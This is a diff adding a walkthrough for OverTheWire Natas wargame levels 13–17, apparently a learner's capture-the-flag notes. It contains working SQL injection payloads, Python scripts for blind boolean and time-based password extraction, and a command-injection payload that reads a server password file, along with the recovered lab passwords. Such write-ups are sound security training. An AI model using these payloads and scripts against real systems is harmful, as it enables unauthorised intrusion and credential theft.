@@ -416,7 +416,222 @@ pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 user: natas14
 pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
+When we login with the above credentials, we get a username and password form. Source code is also available
+```
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas14', '<censored>');
+    mysql_select_db('natas14', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
 
+    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysql_close($link);
+} else {
+?>
+```
++ First we can try giving some normal usernames and passwords, like `user: test` and `password: test`. When get a message saying `access denied`.
++ Seeing the source code, we can try for sql injection vulnerability.
++ When I gave `'` , I got the same message, `access denied!`
++ When I tried giving `"`, I got the following error
+`Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
+Access denied!`
++ So, this gives the probability of sql injection and try to comment out rest of the query.
++ So, when I gave ` " or 1=1 # ` we got the password.
+Successful login! The password for natas15 is `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
+
+# Level 14 -> level 15:
+
+user: natas15
+password:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+When we login with the above credentials, we get a username name field to check the existence of a username.
+When I tried giving `username: guest`, it says username doesnt exist.
+```
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+```
++ As, we can see, we only get two outputs, `user exists` and `user doesnt exists`.
++ However, there is an SQL injection in the username field, but it’s a blind one. We only get true/false answers. So, we can try a bruteforcing technique using ython script to get the password for level 16.
++ `SELECT * from users where username="natas16" and password like binary "x%"` So, this query checks whether the password starts with x.
++ Likewise we use each and every letter and bruteforce it until we get the flag
++ Python Script:
+```
+import requests
+import sys
+from string import digits, ascii_lowercase, ascii_uppercase
+
+url = "http://natas15.natas.labs.overthewire.org/"
+charset = ascii_lowercase + ascii_uppercase + digits
+sqli = 'natas16" AND password LIKE BINARY "'
+
+s = requests.Session()
+s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+
+password = ""
+# We assume that the password is 32 chars 
+while len(password) < 32:
+    for char in charset:
+        r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
+        if "This user exists" in r.text:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            password += char
+            break
+```
+Pass of level 16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+# Level 15 -> Level 16:
+
+user: natas16
+password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+When we login with the above credentials, we get a form saying `For security reasons, we now filter even more on certain characters
+Find words containing: `
++ Source code is given,
+```
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
++ This level is similar to level 10, but we have some illegal characters.
++ illegal characters: ;|&`'"
++ We have the key variable which originally sets to nothing. It will check the characters whether it is in the blacklist or not, if it passes that check it will run the command:
+grep -i \”$key\” dictionary.txt
++ grep uses regular expression, let’s use regular expression character like ^ (caret) which means the first character of the string.
+Let’s say ^b , if b is the first character we will not get any result. 
+So, we wrote python script to solve this:
+```
+import requests
+import sys
+from string import digits, ascii_lowercase, ascii_uppercase
+
+charset = ascii_lowercase + ascii_uppercase + digits
+s = requests.Session()
+s.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+
+password = ""
+# We assume that the password is 32 chars 
+while len(password) < 32:
+    for char in charset:
+        payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
+        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)
+
+        if len(r.text) == 1105:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            password += char
+            break
+```
++ Thus, we get the password as: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+# Level 16 -> level 17:
+ user: natas17
+ pass: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+ 
+ + When we login with the aove credentials, we get a username field to check the existence of a username
+ + source code given:
+ ```
+ <?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas17', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+```
++ This level will not give any output, so again a sql bling injection, this time we can use time based sql injection.
++ So, the python script looks like:
+```
+import requests
+import sys
+from string import digits, ascii_lowercase, ascii_uppercase
+
+charset = ascii_lowercase + ascii_uppercase + digits
+sqli_1 = 'natas18" AND password LIKE BINARY "'
+sqli_2 = '" AND SLEEP(5)-- '
+
+s = requests.Session()
+s.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+
+password = ""
+# We assume that the password is 32 chars 
+while len(password) < 32:
+    for char in charset:
+        try:
+            payload = {'username':sqli_1 + password + char + "%" + sqli_2}
+            r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout=1)
+        except requests.Timeout:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            password += char
+            break
+```
+Thus we obtain the password as: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
 
     
